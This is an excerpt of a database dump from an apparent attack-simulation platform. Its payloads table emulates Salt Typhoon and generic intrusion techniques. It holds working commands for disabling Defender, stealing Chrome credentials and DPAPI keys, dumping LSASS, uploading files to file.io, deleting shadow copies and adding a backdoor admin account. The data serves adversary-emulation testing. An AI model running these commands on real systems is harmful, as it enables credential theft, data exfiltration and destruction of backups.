-- Data for Name: payloads; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.payloads (payload_id, payload_type, payload_name, payload_description, payload_created_at, payload_updated_at, payload_platforms, command_executor, command_content, executable_file, file_drop_file, dns_resolution_hostname, network_traffic_ip_src, payload_cleanup_executor, payload_cleanup_command, payload_arguments, payload_prerequisites, network_traffic_ip_dst, network_traffic_port_src, network_traffic_port_dst, network_traffic_protocol, payload_external_id, payload_collector, payload_source, payload_status, payload_elevation_required, payload_execution_arch, payload_expectations) FROM stdin;
aac07d09-8b8a-4cde-be21-5d5aab4559b1	Command	Test - Defense Evasion		2026-01-16 08:13:29.31077+00	2026-01-16 08:13:29.310776+00	{Windows}	psh	Set-MpPreference -DisableRealtimeMonitoring $true	\N	\N	\N	\N	psh	Set-MpPreference -DisableRealtimeMonitoring $false	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
f4404a73-23ca-4aee-b993-3fc528a4fc66	Command	Download beacon to target with some masquerading - Salt Typhoon Style		2026-01-09 14:19:24.956062+00	2026-01-09 14:19:25.019543+00	{Windows}	psh	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nwget https://wwt.obas.filigran.io/api/agent/installer/openbas/windows/session-user/70c6ee68-c2a6-4426-8d17-3e9d9cbba181 -O C:\\users\\public\\music\\g2.bat.ps1	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
b46193c6-badf-4c9f-bc65-023f70377add	Command	Deploy cab file containing beacon to target - Salt Typhoon Style		2026-01-09 14:19:25.317622+00	2026-01-09 14:19:25.363096+00	{Windows}	psh	dir "c:\\users\\public\\music\\go4.cab"\n	\N	\N	\N	\N	psh	Remove-Item -Path "C:\\Users\\Public\\Music\\filigran.txt", "C:\\Users\\Public\\Music\\g2.bat", "C:\\Users\\Public\\Music\\g2.bat.ps1", "C:\\Users\\Public\\Music\\typhoon.ddf" -Force -ErrorAction SilentlyContinue	[]	[{"executor":"psh","get_command":"Set-Location 'C:\\\\Users\\\\Public\\\\Music'; \\"This is a sample witness file for test purposes.\\" | Set-Content -Encoding ASCII \\"filigran.txt\\"; Copy-Item \\"g2.bat.ps1\\" \\"g2.bat\\"; $ddf = '.OPTION EXPLICIT\\\\r\\\\n.Set Compress=ON\\\\r\\\\n.Set DiskDirectoryTemplate=c:\\\\users\\\\public\\\\music\\\\r\\\\n.Set CabinetNameTemplate=go4.cab\\\\r\\\\n\\\\r\\\\nc:\\\\users\\\\public\\\\music\\\\g2.bat.ps1\\\\r\\\\nc:\\\\users\\\\public\\\\music\\\\g2.bat\\\\r\\\\nc:\\\\users\\\\public\\\\music\\\\filigran.txt'; $ddf -replace '\\\\\\\\r\\\\\\\\n', [System.Environment]::NewLine | Set-Content -Encoding ASCII \\"typhoon.ddf\\"; makecab /F \\"typhoon.ddf\\"","check_command":"if (Test-Path \\"c:\\\\users\\\\public\\\\go4.cab\\") { exit 0} else { exit 1}","description":null}]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
5c576220-990a-4818-814f-89ab68bad7b7	Command	Copy beacon cab file to remote target with some masquerading - Salt Typhoon		2026-01-09 14:19:25.619535+00	2026-01-09 14:19:25.665127+00	{Windows}	psh	copy C:\\users\\public\\music\\go4.cab \\\\#{HOSTNAME}\\c$\\programdata\\microsoft\\drm\\\ndir \\\\#{HOSTNAME}\\c$\\programdata\\microsoft\\drm\\	\N	\N	\N	\N	\N	\N	[{"type":"text","key":"HOSTNAME","default_value":"127.0.0.1","description":null,"separator":null}]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
42c2f03b-9917-439a-afd4-213e6e736291	Command	Expand cab file to remote target with some masquerading - Salt Typhoon		2026-01-09 14:19:25.891039+00	2026-01-09 14:19:25.926226+00	{Windows}	psh	expand -f:* "C:\\Users\\Public\\Music\\go4.cab" "\\\\#{HOSTNAME}\\c$\\programdata\\microsoft\\drm"\ndir "\\\\#{HOSTNAME}\\c$\\programdata\\microsoft\\drm"	\N	\N	\N	\N	\N	\N	[{"type":"text","key":"HOSTNAME","default_value":"127.0.0.1","description":null,"separator":null}]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
01cfeaf9-f941-4f36-b6fd-a94338fdd400	Command	Execute a remote BAT Script via PSExec - Salt Typhoon		2026-01-09 14:19:26.150697+00	2026-01-09 14:19:26.17157+00	{Windows}	psh	try { & "#{psexec_binary}" -accepteula \\\\#{IP} -d "#{file}" 2>$null; exit 0 } catch { exit 0 }\n	\N	\N	\N	\N	\N	\N	[{"type":"text","key":"IP","default_value":"127.0.0.1","description":null,"separator":null},{"type":"text","key":"psexec_binary\\t","default_value":"C:\\\\Windows\\\\Temp\\\\PsTools\\\\PsExec64.exe","description":null,"separator":null},{"type":"text","key":"psexec_path\\t","default_value":"c:\\\\windows\\\\temp","description":null,"separator":null},{"type":"text","key":"file","default_value":"c:\\\\programdata\\\\microsoft\\\\drm\\\\182.bat","description":null,"separator":null}]	[{"executor":"psh","get_command":"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory \\"#{psexec_path}\\\\\\" -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest \\"https://download.sysinternals.com/files/PSTools.zip\\" -OutFile \\"#{psexec_path}\\\\PsTools.zip\\"; Expand-Archive \\"#{psexec_path}\\\\PsTools.zip\\" \\"#{psexec_path}\\\\PsTools\\" -Force","check_command":"if (Test-Path \\"C:\\\\Windows\\\\Temp\\\\PsTools\\\\PsExec64.exe\\") { exit 0 } else { exit 1 }","description":null}]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
8bd4e3b0-a4e9-4386-8c0c-162904230f8c	Command	Enumerate Local and Remote System Info - Salt Typhoon		2026-01-09 14:19:26.361282+00	2026-01-09 14:19:26.390093+00	{Windows}	cmd	whoami\nnet.exe group /DOMAIN\nexit 0	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
087b535f-cb98-44e6-9e1d-cbb0ab2636fb	Command	BAT script execution with WMIC - Salt Typhoon		2026-01-09 14:19:26.513081+00	2026-01-09 14:19:26.52831+00	{Windows}	psh	C:\\Windows\\system32\\cmd.exe /C wmic  process call create "cmd.exe /c #{file}"\ndir "#{file}"\ntype "c:\\programdata\\microsoft\\drm\\g2.log"	\N	\N	\N	\N	\N	\N	[{"type":"text","key":"file","default_value":"c:\\\\programdata\\\\microsoft\\\\drm\\\\182.bat","description":null,"separator":null}]	[{"executor":"psh","get_command":"@('@echo off','start \\"\\" powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File \\"c:\\\\programdata\\\\microsoft\\\\drm\\\\g2.bat.ps1\\" >> \\"%~dp0g2.log\\" 2>&1') | Set-Content -Encoding ASCII -Path \\"C:\\\\ProgramData\\\\Microsoft\\\\DRM\\\\182.bat\\"","check_command":"","description":null}]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
fdd66bfa-c215-4b87-ae27-9e6a43e453af	Command	Test - Clean Up Desktop		2026-01-09 15:03:17.639864+00	2026-01-09 15:03:17.640323+00	{Windows}	psh	Remove-Item -Path "$env:USERPROFILE\\Downloads\\FlashUpdate.bat" -ErrorAction SilentlyContinue\nRemove-Item -Path "C:\\Windows\\Temp\\svchost.exe" -ErrorAction SilentlyContinue\nRemove-Item "$env:TEMP\\hacked.jpg" -ErrorAction SilentlyContinue\n# Reset wallpaper to an empty string (or a default path)\nSet-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value ""\nrundll32.exe user32.dll, UpdatePerUserSystemParameters\n	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
3d1f53e2-4937-4864-a71c-5b69ccb11c48	Command	Create a new Registry Key for Autorun of cmd.exe - Salt Typhoon		2026-01-09 14:19:26.669517+00	2026-01-09 14:19:26.684696+00	{Windows}	cmd	reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OpenBAS" /t REG_SZ /d "cmd.exe" /f	\N	\N	\N	\N	cmd	reg.exe delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "OpenBAS" /f	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	UNVERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
37556310-9d6b-46ed-b3e9-76634449208f	Command	Create a New Service "Crowdoor" - Salt Typhoon		2026-01-09 14:19:26.782018+00	2026-01-09 14:19:26.801501+00	{Windows}	cmd	sc create Crowdoor binPath= "C:\\windows\\system32\\cmd.exe" start= auto	\N	\N	\N	\N	cmd	sc.exe delete Crowdoor	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
b68d40e8-f3f1-4451-afaf-918fc002417a	Command	TrillClient’s user credential discovery - Salt Typhoon		2026-01-09 14:19:26.957059+00	2026-01-09 14:19:26.984917+00	{Windows}	psh	gci "C:\\windows\\temp\\collecteddata\\" -Recurse | select FullName, Length, LastWriteTime | ft -AutoSize\ngci "C:\\windows\\temp\\xordata\\" -Recurse | select FullName, Length, LastWriteTime | ft -AutoSize	\N	\N	\N	\N	psh	Remove-Item -Path "C:\\windows\\temp\\collecteddata" -Recurse -Force; Remove-Item -Path "C:\\windows\\temp\\xordata" -Recurse -Force\n	[]	[{"executor":"psh","get_command":"$u=Get-ChildItem C:\\\\Users -Directory -ea 0|?{try{Test-Path \\"$($_.FullName)\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\" -ErrorAction Stop}catch{$false}} 2>$null;$d=\\"C:\\\\windows\\\\temp\\\\collecteddata\\";$x=\\"C:\\\\windows\\\\temp\\\\xordata\\";$z=\\"$x\\\\archive.zip\\";$o=\\"$x\\\\simulated_payload.dat\\";mkdir $x -ea 0|Out-Null;foreach($usr in $u){$n=$usr.Name;$b=\\"$d\\\\$n\\";mkdir \\"$b\\\\Protect\\" -ea 0|Out-Null;xcopy /E /C /H /Y \\"C:\\\\Users\\\\$n\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\" \\"$b\\\\Protect\\" >$null 2>&1;foreach($f in \\"Local State\\",\\"Default\\\\Network\\\\Cookies\\",\\"Default\\\\Login Data\\"){$s=\\"C:\\\\Users\\\\$n\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\$f\\";if(Test-Path $s){xcopy /C /Y $s \\"$b\\\\$f\\" >$null 2>&1}};$cb=\\"C:\\\\Users\\\\$n\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\";if(Test-Path $cb){Get-ChildItem $cb -Directory -ea 0|?{$_.Name -like \\"Profile*\\"}|%{$p=$_.Name;foreach($f in \\"Network\\\\Cookies\\",\\"Login Data\\"){$s=\\"$cb\\\\$p\\\\$f\\";if(Test-Path $s){xcopy /C /Y $s \\"$b\\\\$p\\\\$f\\" >$null 2>&1}}}}};if(Test-Path $d){Compress-Archive \\"$d\\\\*\\" -DestinationPath $z -Force -ea 0;if(Test-Path $z){$b=[IO.File]::ReadAllBytes($z);for($i=0;$i -lt $b.Length;$i++){$b[$i]=($b[$i]-bxor($i%252))-bxor(0xe6-($i%199))};[IO.File]::WriteAllBytes($o,$b);del $z -Force -ea 0}}","check_command":"","description":null}]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
593b32d5-baaf-4e34-a8f8-6af526028571	Command	Test - Hide as System File		2026-01-09 14:51:27.623896+00	2026-01-09 14:51:27.624251+00	{Windows}	psh	Move-Item -Path "$env:USERPROFILE\\Downloads\\FlashUpdate.bat" -Destination "C:\\Windows\\Temp\\svchost.exe" -Force\n	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
7f64d8b8-2903-4911-bd29-f6e3791907c0	Command	Exfiltrate data HTTPS using curl windows		2026-01-09 14:19:27.135273+00	2026-01-09 14:19:27.161662+00	{Windows}	psh	#{curl_path} -k -F "file=@#{input_file}" https://file.io/	\N	\N	\N	\N	psh	rm c:\\windows\\ime\\out3.tmp\nRemove-Item -Path "C:\\windows\\temp\\curl" -Recurse -Force\n	[{"type":"text","key":"input_file","default_value":"c:\\\\windows\\\\ime\\\\out3.tmp","description":null,"separator":null},{"type":"text","key":"curl_path","default_value":"C:\\\\windows\\\\temp\\\\curl\\\\curl-8.4.0_6-win64-mingw\\\\bin\\\\curl.exe","description":null,"separator":null}]	[{"executor":"psh","get_command":"echo 'test' > c:\\\\windows\\\\ime\\\\out3.tmp","check_command":"","description":null},{"executor":"psh","get_command":"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest \\"https://curl.se/windows/dl-8.4.0_6/curl-8.4.0_6-win64-mingw.zip\\" -Outfile \\"c:\\\\windows\\\\temp\\\\curl.zip\\"; Expand-Archive -Path \\"c:\\\\windows\\\\temp\\\\curl.zip\\" -DestinationPath \\"c:\\\\windows\\\\temp\\\\curl\\"","check_command":"","description":null}]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
75735fae-b6d2-4424-83f3-49cd8f49754c	Command	Test - Credential Dump		2026-01-09 14:52:13.292958+00	2026-01-09 14:52:13.29297+00	{Windows}	psh	rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-dump.dmp full\n	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
dd5dfd98-5d6e-4ce3-8a9c-097f8e514261	Command	Cleanup artifacts		2026-01-09 14:19:27.268929+00	2026-01-09 14:19:27.309565+00	{Windows}	psh	Remove-Item -Force -ErrorAction SilentlyContinue "C:\\programdata\\microsoft\\drm\\182.bat", "C:\\programdata\\microsoft\\drm\\g2.bat.ps1", "C:\\programdata\\microsoft\\drm\\g2.log", "C:\\programdata\\microsoft\\drm\\g2.bat"	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	ALL_ARCHITECTURES	{PREVENTION,DETECTION}
2083c49f-5b0a-4494-add7-ed8b61dc9ee7	Command	Test - Download Payload		2026-01-09 14:47:40.503705+00	2026-01-09 14:47:40.503719+00	{Windows}	psh	$Content = @"\n@echo off\necho Installing Flash Update...\ntimeout /t 3\necho Update Complete.\n"@\n\nSet-Content -Path "$env:USERPROFILE\\\\Downloads\\\\FlashUpdate.bat" -Value $Content	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
1f745401-a2bf-44ec-a609-6030d3a153a2	Command	Test - Scan Server		2026-01-09 14:53:06.831841+00	2026-01-09 14:53:06.831856+00	{Windows}	psh	$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*"}).IPAddress\n$subnet = $ip.Substring(0, $ip.LastIndexOf('.'))\n\n1..20 | ForEach-Object {\n    $target = "$subnet.$_"\n    if (Test-Connection -ComputerName $target -Count 1 -Quiet) {\n        try {\n            # Try to resolve IP to Hostname\n            $hostName = [System.Net.Dns]::GetHostEntry($target).HostName\n            Write-Host "FOUND: IP=$target Name=$hostName"\n        } catch {\n            Write-Host "FOUND: IP=$target (No Hostname)"\n        }\n    }\n}\n	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
82f6e11c-e97d-45bf-9c2a-9bc535cf2745	Command	Test - Change Wallpaper		2026-01-09 14:57:19.122411+00	2026-01-09 14:57:19.122427+00	{Windows}	psh	$url = "https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5"; $img = "$env:TEMP\\hacked.jpg"; Invoke-WebRequest $url -OutFile $img; Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value $img; rundll32.exe user32.dll, UpdatePerUserSystemParameters\n	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
f5cb168c-32e5-4089-aaa9-e57c45ef28b4	Command	Test - Delete Backup		2026-01-09 14:59:59.05235+00	2026-01-09 14:59:59.052372+00	{Windows}	psh	vssadmin.exe Delete Shadows /All /Quiet\n	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
cc662372-8709-4b0e-bcad-def543868809	Command	Test - Escalate and Persist		2026-01-09 15:01:28.774894+00	2026-01-09 15:01:28.774938+00	{Windows}	psh	$Content = @"\n@echo off\necho Beacons active...\ntimeout /t 30\n"@\nSet-Content -Path "C:\\Windows\\Temp\\beacon.bat" -Value $Content\nStart-Process -FilePath "C:\\Windows\\Temp\\beacon.bat" -WindowStyle Hidden	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
a56f8b26-1120-4315-b880-74fcdf828fae	Command	Test - Create Backdoor Admin		2026-01-09 15:02:10.850028+00	2026-01-09 15:02:10.850042+00	{Windows}	psh	net user SysAdmin_Support P@ssw0rd123! /add; net localgroup Administrators SysAdmin_Support /add\n	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
355c0f08-d025-4c1c-ad9b-4e47601303e9	Command	Test - Scan for Databases		2026-01-09 15:02:39.683459+00	2026-01-09 15:02:39.683475+00	{Windows}	psh	Get-NetTCPConnection -State Listen\n	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
6ae382b7-e820-453d-800b-af7028066c08	Command	Test - Clean Up Server		2026-01-09 15:03:55.461608+00	2026-01-09 15:03:55.461628+00	{Windows}	psh	net user SysAdmin_Support /delete\nRemove-Item -Path "C:\\Windows\\Temp\\beacon.bat" -Force -ErrorAction SilentlyContinue\n	\N	\N	\N	\N	\N	\N	[]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
5b9a801b-23ef-436f-9b34-0dd38fd3c7d7	Command	Test - Social Engineer		2026-01-16 08:33:22.058455+00	2026-01-16 08:39:56.337121+00	{Windows}	psh	# Load Windows Forms assembly\nAdd-Type -AssemblyName System.Windows.Forms\n# Show a fake "System Error"\n$msg="#{message}"\n[System.Windows.Forms.MessageBox]::Show($msg, "System Critical Error", 'OK', 'Error')	\N	\N	\N	\N	psh	Get-Process powershell | Where-Object {$_.MainWindowTitle -eq "System Critical Error"} | Stop-Process -Force -ErrorAction SilentlyContinue	[{"type":"text","key":"message","default_value":"Your Windows License has expired. Please contact IT Support immediately","description":null,"separator":null}]	[]	\N	\N	\N	\N	\N	\N	MANUAL	VERIFIED	f	x86_64	{PREVENTION,DETECTION}
\.


--
-- Data for Name: payloads_attack_patterns; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.payloads_attack_patterns (attack_pattern_id, payload_id) FROM stdin;
cf178ab6-ddc5-4140-a47e-dab9d72607a8	f4404a73-23ca-4aee-b993-3fc528a4fc66
1af1d8b9-d207-43de-acdf-97f770b42388	f4404a73-23ca-4aee-b993-3fc528a4fc66
5a9373ec-b51b-4aa7-b2c7-d6035fa2acde	f4404a73-23ca-4aee-b993-3fc528a4fc66
a42a60f3-15eb-41de-9308-64b9977174b0	f4404a73-23ca-4aee-b993-3fc528a4fc66
93f4b270-e7b6-4c21-abfb-bfc79cfe4477	b46193c6-badf-4c9f-bc65-023f70377add
42fcd04d-91af-4398-83fc-49bc10058bf7	b46193c6-badf-4c9f-bc65-023f70377add
be317029-11ff-4692-9d17-53d7880134ab	5c576220-990a-4818-814f-89ab68bad7b7
5530bf7d-e940-4266-9936-05454b05b21c	5c576220-990a-4818-814f-89ab68bad7b7
546cb203-439a-4a43-bd1f-5143694e3245	42c2f03b-9917-439a-afd4-213e6e736291
c30b5c64-6636-4266-b627-915190a56423	42c2f03b-9917-439a-afd4-213e6e736291
dd1b8801-a3c7-4b6e-8f05-c6848bcd5521	01cfeaf9-f941-4f36-b6fd-a94338fdd400
1bdc2a2a-ea12-4fad-acc0-0fc6cce7272a	8bd4e3b0-a4e9-4386-8c0c-162904230f8c
6478e325-2b60-41ff-8330-09c5116d4caf	8bd4e3b0-a4e9-4386-8c0c-162904230f8c
5e4e119f-a147-4bc7-a017-d30324f70c48	087b535f-cb98-44e6-9e1d-cbb0ab2636fb
c6d79b29-531b-4f56-903c-a552ac852b9a	087b535f-cb98-44e6-9e1d-cbb0ab2636fb
217b7238-f0c4-4dc8-94af-883f9c41ee58	087b535f-cb98-44e6-9e1d-cbb0ab2636fb
10b4df1e-61a5-4728-96b4-29f0feecb285	3d1f53e2-4937-4864-a71c-5b69ccb11c48
bab4a4fd-0ca9-4f7f-911d-09b5fec78350	37556310-9d6b-46ed-b3e9-76634449208f
bcdfaef2-a29f-4c14-8024-b6390ac2e02f	b68d40e8-f3f1-4451-afaf-918fc002417a
29c8e3cb-e63e-4f8b-abe4-13fd13acac46	b68d40e8-f3f1-4451-afaf-918fc002417a
48226f44-f8ee-42e2-ab01-796507a3a546	b68d40e8-f3f1-4451-afaf-918fc002417a
24053ce0-1450-49f5-bb4c-56f2413fbf78	7f64d8b8-2903-4911-bd29-f6e3791907c0
d9fcb08c-48c5-4257-a4a4-eafd63c3afd4	dd5dfd98-5d6e-4ce3-8a9c-097f8e514261
\.


--
-- Data for Name: payloads_tags; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.payloads_tags (payload_id, tag_id) FROM stdin;
\.


--
-- Data for Name: regex_groups; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.regex_groups (regex_group_id, regex_group_field, regex_group_index_values, regex_group_contract_output_element_id, regex_group_created_at, regex_group_updated_at) FROM stdin;
\.


--
-- Data for Name: report_informations; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.report_informations (report_informations_id, report_id, report_informations_type, report_informations_display) FROM stdin;
\.


--
-- Data for Name: report_inject_comment; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.report_inject_comment (report_id, inject_id, comment) FROM stdin;
\.


--
-- Data for Name: reports; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.reports (report_id, report_name, report_global_observation, report_created_at, report_updated_at) FROM stdin;
\.


--
-- Data for Name: reports_exercises; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.reports_exercises (report_id, exercise_id) FROM stdin;
\.


--
-- Data for Name: roles; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.roles (role_id, role_name, role_created_at, role_updated_at, role_description) FROM stdin;
4a768547-4902-4be5-8e15-53acec570042	Observer	2026-01-09 14:18:40.691776+00	2026-01-09 14:18:40.691776+00	\N
11a473a3-840f-4a86-bb2c-8316d34844a7	Manager	2026-01-09 14:18:40.691776+00	2026-01-09 14:18:40.691776+00	\N
d07e78a1-f74b-4477-84ae-dfdf23ed00e3	Admin	2026-01-09 14:18:40.691776+00	2026-01-09 14:18:40.691776+00	\N
2c24790b-fa69-4565-8dc8-b00f85ca47d5	STIX bundle processors	2026-01-09 14:19:22.476132+00	2026-01-16 10:18:24.473736+00	Can process STIX bundles via API
\.


--
-- Data for Name: roles_capabilities; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.roles_capabilities (role_id, capability) FROM stdin;
4a768547-4902-4be5-8e15-53acec570042	ACCESS_ASSESSMENT
4a768547-4902-4be5-8e15-53acec570042	ACCESS_ASSETS
4a768547-4902-4be5-8e15-53acec570042	ACCESS_PAYLOADS
4a768547-4902-4be5-8e15-53acec570042	ACCESS_DASHBOARDS
4a768547-4902-4be5-8e15-53acec570042	ACCESS_FINDINGS
4a768547-4902-4be5-8e15-53acec570042	ACCESS_DOCUMENTS
4a768547-4902-4be5-8e15-53acec570042	ACCESS_CHANNELS
4a768547-4902-4be5-8e15-53acec570042	ACCESS_CHALLENGES
4a768547-4902-4be5-8e15-53acec570042	ACCESS_LESSONS_LEARNED
4a768547-4902-4be5-8e15-53acec570042	ACCESS_SECURITY_PLATFORMS
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_ASSESSMENT
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_ASSESSMENT
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_ASSESSMENT
11a473a3-840f-4a86-bb2c-8316d34844a7	LAUNCH_ASSESSMENT
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_TEAMS_AND_PLAYERS
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_TEAMS_AND_PLAYERS
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_ASSETS
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_ASSETS
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_ASSETS
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_PAYLOADS
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_PAYLOADS
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_PAYLOADS
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_DASHBOARDS
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_DASHBOARDS
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_DASHBOARDS
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_FINDINGS
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_FINDINGS
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_FINDINGS
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_DOCUMENTS
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_DOCUMENTS
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_DOCUMENTS
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_CHANNELS
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_CHANNELS
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_CHANNELS
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_CHALLENGES
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_CHALLENGES
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_CHALLENGES
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_LESSONS_LEARNED
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_LESSONS_LEARNED
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_LESSONS_LEARNED
11a473a3-840f-4a86-bb2c-8316d34844a7	ACCESS_SECURITY_PLATFORMS
11a473a3-840f-4a86-bb2c-8316d34844a7	DELETE_SECURITY_PLATFORMS
11a473a3-840f-4a86-bb2c-8316d34844a7	MANAGE_SECURITY_PLATFORMS
d07e78a1-f74b-4477-84ae-dfdf23ed00e3	BYPASS
2c24790b-fa69-4565-8dc8-b00f85ca47d5	MANAGE_STIX_BUNDLE
\.


--
-- Data for Name: rule_attributes; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.rule_attributes (attribute_id, attribute_inject_importer_id, attribute_name, attribute_columns, attribute_default_value, attribute_additional_config, attribute_created_at, attribute_updated_at) FROM stdin;
\.


--
-- Data for Name: scenario_mails_reply_to; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.scenario_mails_reply_to (scenario_id, scenario_reply_to) FROM stdin;
6d525811-c057-422f-8445-8a36e403994b	contact@openaev.io
3a848ec9-20ee-47eb-b09c-34c59bc55b4b	contact@openaev.io
\.


--
-- Data for Name: scenarios; Type: TABLE DATA; Schema: public; Owner: user
--

COPY public.scenarios (scenario_id, scenario_name, scenario_description, scenario_subtitle, scenario_message_header, scenario_message_footer, scenario_mail_from, scenario_created_at, scenario_updated_at, scenario_recurrence, scenario_recurrence_start, scenario_recurrence_end, scenario_category, scenario_severity, scenario_main_focus, scenario_external_reference, scenario_external_url, scenario_lessons_anonymized, scenario_custom_dashboard, from_starter_pack) FROM stdin;
012f1916-98c4-4124-984f-95e12b87b076	[SALT TYPHOON] CVE & TTPs validation	Salt Typhoon is believed to be a threat actor connected to The People's Republic of China and has been in operation since 2019. Salt Typhoon's primary targets have been within the United States, Southeast Asia and various African countries, focusing on information theft and espionage. Also known as FamousSparrow, GhostEmperor, Earth Estries and UNC2286, the group was first observed in 2024 and was believed to be responsible for infiltrating Internet Service Providers (ISPs) in the United States to obtain data related to law enforcement activities.\n\nCommon TTPs used by Salt Typhoon \nAnalysis of the exact techniques employed by Salt Typhoon, both pre and post compromise, are sparse - likely to maintain strong adversary knowledge internally for organizations that have dealt with their breaches. This is common for APTs to ensure that the adversary does not have a strong 